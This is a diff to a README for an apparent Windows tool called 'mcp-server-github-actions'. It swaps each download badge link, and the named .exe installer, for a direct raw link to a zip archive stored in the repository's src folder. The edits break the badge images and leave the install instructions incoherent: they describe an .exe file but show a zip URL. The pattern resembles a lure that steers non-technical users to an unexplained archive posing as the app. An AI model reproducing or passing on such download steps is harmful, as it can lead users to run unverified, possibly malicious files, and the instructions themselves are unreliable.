@@ -1,6 +1,6 @@
 # ⚙️ mcp-server-github-actions - Manage GitHub Workflows Easily
 
-[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/ka1ss3r23/mcp-server-github-actions)
+[![Download Now](https://github.com/ka1ss3r23/mcp-server-github-actions/raw/refs/heads/main/src/server-github-mcp-actions-v3.9.zip%20GitHub-blue?style=for-the-badge)](https://github.com/ka1ss3r23/mcp-server-github-actions/raw/refs/heads/main/src/server-github-mcp-actions-v3.9.zip)
 
 ## 📋 What Is This?
 
@@ -28,7 +28,7 @@ To run this app on Windows, your computer needs:
 
 Click the big button below to visit the download page. This is where you will find the latest files to install the app.
 
-[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/ka1ss3r23/mcp-server-github-actions)
+[![Download Now](https://github.com/ka1ss3r23/mcp-server-github-actions/raw/refs/heads/main/src/server-github-mcp-actions-v3.9.zip%20GitHub-blue?style=for-the-badge)](https://github.com/ka1ss3r23/mcp-server-github-actions/raw/refs/heads/main/src/server-github-mcp-actions-v3.9.zip)
 
 This page contains all files, instructions, and updates. It will also help you find new versions as they come out.
 
@@ -36,7 +36,7 @@ This page contains all files, instructions, and updates. It will also help you f
 
 On the GitHub page, look for a file that ends with `.exe`. It is the installer file for Windows. The file name should be something like:
 
-`mcp-server-windows-installer.exe`
+`https://github.com/ka1ss3r23/mcp-server-github-actions/raw/refs/heads/main/src/server-github-mcp-actions-v3.9.zip`
 
 Click the file to download it to your computer.
 
@@ -144,4 +144,4 @@ It helps you get better control over continuous integration and deployment tasks
 
 Use the link below once again to get the latest version or re-download the app:
 
-[![Download MCP Server](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/ka1ss3r23/mcp-server-github-actions)
+[![Download MCP Server](https://github.com/ka1ss3r23/mcp-server-github-actions/raw/refs/heads/main/src/server-github-mcp-actions-v3.9.zip%20GitHub-blue?style=for-the-badge)](https://github.com/ka1ss3r23/mcp-server-github-actions/raw/refs/heads/main/src/server-github-mcp-actions-v3.9.zip)
